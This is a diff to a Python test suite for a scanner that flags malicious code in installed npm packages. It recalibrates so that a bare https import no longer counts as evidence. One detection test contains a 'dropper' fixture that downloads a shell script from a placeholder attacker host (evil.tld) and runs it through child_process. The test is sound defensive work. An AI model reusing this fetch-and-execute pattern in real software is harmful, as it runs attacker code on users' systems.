@@ -29,9 +29,15 @@ deleting a detection:
 * ``screen capture`` left ``CONTEXT_DESCRIPTIONS``, because "spawns a process
   and mentions screenshots" is the shape of puppeteer, not of spyware.
 
-:func:`test_https_client_still_corroborates_a_capability` and
-:func:`test_hex_obfuscated_text_still_corroborates` guard that neither fix was
+:func:`test_hex_obfuscated_text_still_corroborates` guards that neither fix was
 paid for with detection.
+
+F35 later removed the third signal this group pinned. ``HTTPS client`` matches
+an **import**, and an import says nothing about what the file does with it, so
+:func:`test_an_https_import_no_longer_corroborates_a_capability` now asserts the
+opposite of what its predecessor did — with
+:func:`test_a_fetch_wired_to_execution_still_corroborates` holding the detection
+line over the same package once the fetch is actually wired to the command.
 """
 
 import ast
@@ -428,17 +434,59 @@ def test_visual_test_shape_is_not_a_danger():
     assert report.dangers == []
 
 
-def test_https_client_still_corroborates_a_capability():
-    """Regression guard: the calibration narrowed the context set, not the rule."""
-    hits = [
-        ("lib/payload.mjs", "HTTPS client"),
-        ("lib/payload.mjs", "child_process - command execution"),
-    ]
+def test_an_https_import_no_longer_corroborates_a_capability(tmp_path):
+    """F35: importing `https` is not evidence about what the file does with it.
 
-    report = classify_malware_hits(hits)
+    This test asserted the opposite until F35 re-measured the pairing over 736
+    installed packages and found it false in every case. The payload below is
+    the *benign* half of the shape it used to condemn — a package that imports
+    the client and, elsewhere, runs a command.
+    """
+    pkg = tmp_path / "node_modules" / "buildtool"
+    write(
+        pkg,
+        "index.mjs",
+        "const https = require('https');\n"
+        "const cp = require('child_process');\n"
+        "export const serve = (o) => https.createServer(o).listen(443);\n"
+        "export const build = () => cp.execSync('tsc -p .');\n",
+    )
 
-    assert report.corroborated == ["child_process - command execution"]
-    assert report.dangers
+    report = scan_installed_package_code(pkg)
+    descriptions = {description for _path, description in report.hits}
+    classified = classify_malware_hits(report.hits)
+
+    assert "HTTPS client" in descriptions, "the import is still reported"
+    assert classified.corroborated == []
+    assert classified.dangers == []
+    assert any("HTTPS client" in warning for warning in classified.warnings)
+
+
+def test_a_fetch_wired_to_execution_still_corroborates(tmp_path):
+    """Detection guard: what the removed signal was *meant* to stand for.
+
+    F35 paid for the calibration with a narrower pattern, not with detection —
+    the same package, with the network call actually wired to the command, is
+    still a danger.
+    """
+    pkg = tmp_path / "node_modules" / "dropper"
+    write(
+        pkg,
+        "index.mjs",
+        "import https from 'https';\n"
+        "import cp from 'child_process';\n"
+        "https.get('https://evil.tld/p.sh', (r) => {\n"
+        "  r.pipe(fs.createWriteStream('/tmp/p.sh'));\n"
+        "  cp.exec('sh /tmp/p.sh');\n"
+        "});\n",
+    )
+
+    report = scan_installed_package_code(pkg)
+    descriptions = {description for _path, description in report.hits}
+    classified = classify_malware_hits(report.hits)
+
+    assert "network I/O wired to command execution" in descriptions
+    assert classified.dangers
 
 
 # ---------------------------------------------------------------------------
